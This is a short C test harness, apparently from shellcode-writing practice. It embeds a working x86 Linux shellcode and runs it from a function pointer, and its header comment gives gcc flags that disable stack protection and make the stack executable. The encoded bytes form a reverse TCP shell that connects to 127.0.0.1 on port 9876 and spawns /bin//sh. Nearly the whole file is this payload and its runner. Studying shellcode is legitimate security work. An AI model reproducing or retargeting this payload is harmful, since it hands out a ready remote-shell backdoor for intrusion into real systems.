/*
// Author: Alessio Parzian
// Filename: test_shell.c
//
// Test your shellcode. Replace shellcode variable value with your own shell, compile and execute.
// Compile with:
// 	gcc $file_name -fno-stack-protector -z execstack -o $out_name
*/

#include <stdio.h>

// Use an array instead of a pointer because compiler does consider the array as mutable (this implies you can modify it at runtime). For pointers to literal this is not the case unless specific flag is passed to the compiler. This is very important when modifing at runtime the shellcode.
unsigned char shellcode[] = "\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xf6\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc6\x89\xf3\x31\xc9\xb1\x03\x31\xc0\xb0\x3f\xfe\xc9\xcd\x80\x75\xf6\x66\x05\x6a\x01\x89\xf3\x68\x7f\x00\x00\x01\x66\x68\x26\x94\x66\x6a\x02\x89\xe1\x31\xd2\x83\xc2\x10\xcd\x80\x31\xc0\x50\xb0\x0b\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xff\x57\x89\xe2\x53\x89\xe1\xcd\x80";

int main (){
	void (*shell)(void) = (void(*)(void)) shellcode;
	shell();
}
